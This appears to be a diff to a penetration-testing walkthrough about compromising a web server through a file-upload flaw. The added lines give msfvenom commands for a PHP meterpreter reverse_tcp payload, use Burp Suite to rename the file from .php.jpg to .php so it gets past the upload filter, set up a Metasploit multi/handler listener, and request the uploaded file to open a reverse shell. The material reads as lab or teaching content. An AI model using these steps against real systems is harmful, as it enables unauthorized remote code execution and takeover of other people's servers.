@@ -55,5 +55,26 @@ use auxiliary/scanner/http/wordpress_login_enum
  
  Since the meterpreter session is running, now call the file you just uploaded in order to create a reverse shell. 
  
- This can be accomplished by simply, typing http://example.com/upload/files/paload.php
+ This can be accomplished by simply, typing http://example.com/upload/files/payload.php
  And this will give us the meterpreter session. 
+ 
+ Now we can utilize burpsuite to get a reverse shell. 
+ Generate another payload and safe it as burp.php.jpg file.
+  msfvenom -p phpmeterpreter/reverse_tcp lhost=<ip address> lport=4444 -f raw
+  
+  Upload the file to the vulnerable server. Then open burpsuite app and use interceptor to intercept the file upload request. Once the request is captured with file 
+  burp.php.jpg uploaded to server. In the intercepted request change the file file extension from .php.jpg to burp.php and forward the request. Now turn off the interceptor. 
+ 
+ In Metasploit, 
+
+ type msfconsole
+ use multi/handler
+ set payload php/meterpreter/reverse_tcp
+ set lhost <host ip> 
+ set lport <host port to listen to> 
+ run 
+ 
+ Now we call the file we uploaded by simply visiting file upload secion, http://example.com/upload/files/burp.php. And this will give us reverse shell. 
+ 
+ 
+ 
